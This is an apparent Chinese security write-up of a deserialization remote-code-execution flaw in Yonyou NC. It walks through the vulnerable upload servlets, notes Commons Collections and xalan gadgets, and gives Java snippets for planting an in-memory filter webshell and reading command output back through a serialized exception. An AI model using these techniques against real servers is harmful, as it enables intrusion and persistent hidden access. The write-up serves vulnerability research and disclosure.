# 用友 NC 反序列化RCE漏洞

## 漏洞描述

用友NC 存在反序列化 RCE漏洞，攻击者可利用控制服务器

## 漏洞影响

```
用友 NC
```

## 漏洞复现

首先从任意文件上传说起

任意文件上传分析代码在`servlet.FileReceiveServlet`。在这里我们可以看到，从请求中读取流，然后转换为map类型并读取上传文件的路径。然后再读取待上传的文件。

![yongyou-5-1](https://typora-1308934770.cos.ap-beijing.myqcloud.com/yongyou-5-1.png)

而网上很多poc，大多都是基于此漏洞，利用反序列化上传一个文件到服务器。

这也就是去年的那个任意文件上传的反序列化漏洞。但是，但是，这个漏洞本质是一个反序列化漏洞。而且某C的classpath中，也存在apache commonscollections库，我们可以利用这个库，直接执行命令或者内存马。岂不是比任意文件上传舒服多了。

**内存马**

老样子，在反序列化中想执行任意代码，一般都依靠xalan这个库。这次也不例外。

植入内存马，关键在于我们怎样找到context，只有找到context，我们才可以添加filter。好在某c中，我们只需要通过下面的代码既可以获取当前context，不需要从tomcat中获取context

```java
 Object obj = 改动Locator.getInstance().lookup("ServletContext");
        Field contextField = obj.getClass().getDeclaredField("context");
        contextField.setAccessible(true);
        obj = contextField.get(obj);
        Field contextField1 = obj.getClass().getDeclaredField("context");
        contextField1.setAccessible(true);
        addFitlertoTomcat(contextField1.get(obj));
```

剩下的就是常规操作，可以看我之前的内存马模型，基本不需要很大的改动即可完美适配。

![yongyou-5-2](https://typora-1308934770.cos.ap-beijing.myqcloud.com/yongyou-5-2.png)

**回显**

我们只需要找到这样一个servlet，即存在反序列化的readObject，又将错误信息写入到response中

不难看出 uploadServlet 就很满足这个需求。

```plain
out = new ObjectOutputStream(output);
            in = new ObjectInputStream(request.getInputStream());
            String dsName = (String)in.readObject();
            }
        } catch (Exception var14) {
            var14.printStackTrace();
            if (out == null) {
                throw new ServletException(var14);
            }

            out.writeObject(var14);
```

如果出错的话，将错误信息通过序列化写入到response中。好处在于，我们不需要麻烦的去找tomcat的response对象。

所以，我们将反序列化的payload，发送给uploadServlet即可。然后我们只需要读取响应，即可拿到服务器命令执行的回显结果。客户端代码可以这样写

```java
        ObjectInputStream objectInputStream = new ObjectInputStream(new ByteArrayInputStream(r));
        Exception e = (Exception) objectInputStream.readObject();
        Object obj = e.getCause();
        Field targetF = obj.getClass().getDeclaredField("target");
        targetF.setAccessible(true);
        obj = targetF.get(obj);
        Field msgF = obj.getClass().getSuperclass().getDeclaredField("detailMessage");
        msgF.setAccessible(true);
        String msg = msgF.get(obj).toString();
        System.out.println(msg);
```

## 参考文章

https://mp.weixin.qq.com/s/IdXYbjNVGVIasuwQH48Q1w